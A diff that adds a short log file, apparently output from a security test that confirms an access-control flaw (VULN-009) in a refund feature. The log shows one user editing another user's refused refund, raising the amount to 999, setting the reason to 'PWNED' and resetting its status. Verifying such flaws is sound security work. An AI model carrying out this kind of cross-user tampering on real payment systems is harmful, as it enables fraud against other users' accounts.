@@ -1,0 +1,7 @@
+[INFO] VULN-009: cross-user edit of a REFUSE refund via operator-precedence bug
+[SETUP] seeding PAID payment 913244798 + victim(id=28) REFUSE refund 922290331 (no gateway -> direct seed)
+[SETUP] refund BEFORE: owner=28 amount=50.00 reason=orig_reason_5ocicmn9 status=3 (status 3=REFUSE)
+[STEP] attacker(id=29) edits victim's REFUSE refund: id=922290331 paymentId=913244798 amount=999 reason=PWNED
+[INFO] HTTP 302
+[INFO] refund AFTER: owner=28 amount=999.00 reason=PWNED_5ocicmn9 status=0
+[OK] exploit confirmed — attacker(id=29) edited victim(id=28)'s REFUSE refund (amount/reason changed, status 3->0)
